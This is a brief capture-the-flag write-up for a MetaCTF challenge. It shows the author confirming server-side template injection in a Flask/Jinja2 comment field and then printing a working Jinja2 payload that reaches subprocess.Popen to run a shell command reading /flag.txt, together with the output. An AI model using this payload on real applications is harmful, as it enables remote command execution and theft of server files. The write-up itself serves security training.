Authors mentioned that the application uses flask with jinja2. So i figured it must use ssti<br>
I put {{7*7}} into all the fields and only the comment field showed 49<br>
They also mentioned flag was at /flag.txt<br>

Payload:``` {{dict.mro()[-1].__subclasses__()[365]('cat /flag.txt',shell=True,stdout=-1).communicate()[0]}}```<br>
Output:``` b'MetaCTF{somet1mes_th3_r3nderer_goe$_on_b3nder}\n'```
